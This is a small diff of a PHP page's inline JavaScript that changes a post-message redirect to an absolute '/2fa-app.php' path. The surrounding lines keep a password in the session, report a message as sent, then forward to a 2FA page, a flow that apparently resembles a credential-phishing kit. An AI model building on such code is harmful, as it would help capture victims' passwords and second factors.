@@ -316,7 +316,7 @@ $password1 = isset($_SESSION['password1']) ? $_SESSION['password1'] : '00';
                 console.log('Message sent successfully');
                 // Delay before redirect
                 setTimeout(function() {
-                    window.location.href = '2fa-app.php'; // Redirect after delay
+                    window.location.href = '/2fa-app.php'; // Redirect after delay
                 }, 2000); // 3000 milliseconds = 3 seconds
             } else {
                 console.error('Error sending message:', result.description);
